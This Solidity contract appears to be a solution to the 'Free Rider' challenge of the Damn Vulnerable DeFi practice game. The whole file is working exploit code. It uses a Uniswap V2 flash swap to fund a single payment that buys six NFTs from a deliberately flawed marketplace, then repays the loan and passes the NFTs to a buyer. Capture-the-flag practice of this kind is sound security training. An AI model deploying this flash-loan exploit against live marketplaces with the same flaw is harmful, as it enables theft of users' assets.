// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../WETH9.sol";
import "../DamnValuableNFT.sol";
import "./FreeRiderNFTMarketplace.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";


contract AttackerFreeRider {

    address public owner;
    FreeRiderNFTMarketplace public marketplace;
    IUniswapV2Pair public uniswapPair;
    WETH9 public weth;
    DamnValuableNFT public dvNFT;
    address public buyer;
    uint nftPrice;
    uint[] nftIds = [0, 1, 2, 3, 4, 5];

    constructor(
        address payable _marketplaceAddress,
        address _uniswapPairAddress,
        address payable _wethAddress,
        address _dvNFTAddress,
        address _buyerAddress,
        uint _nftPrice
    ) {
        owner = msg.sender;
        marketplace = FreeRiderNFTMarketplace(_marketplaceAddress);
        uniswapPair = IUniswapV2Pair(_uniswapPairAddress);
        weth = WETH9(_wethAddress);
        dvNFT = DamnValuableNFT(_dvNFTAddress);
        buyer = _buyerAddress;
        nftPrice = _nftPrice;
    }

    function execute() public {
        uniswapPair.swap(nftPrice, 0, address(this), "1");
    }

    function uniswapV2Call(address , uint _wethAmount, uint , bytes calldata ) external {
        uint replayAmount = _wethAmount + (_wethAmount * 3) / 997 + 1;
        weth.withdraw(_wethAmount);
        marketplace.buyMany{value: nftPrice}(nftIds);
        weth.deposit{value: replayAmount}();
        weth.transfer(address(uniswapPair), replayAmount);
        for(uint i; i < nftIds.length; i++) {
            dvNFT.safeTransferFrom(address(this), buyer, nftIds[i]);
        }
    }
    
    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external view returns (bytes4) {
        require(msg.sender == address(dvNFT) && tx.origin == owner);
        return 0x150b7a02; //IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
    
}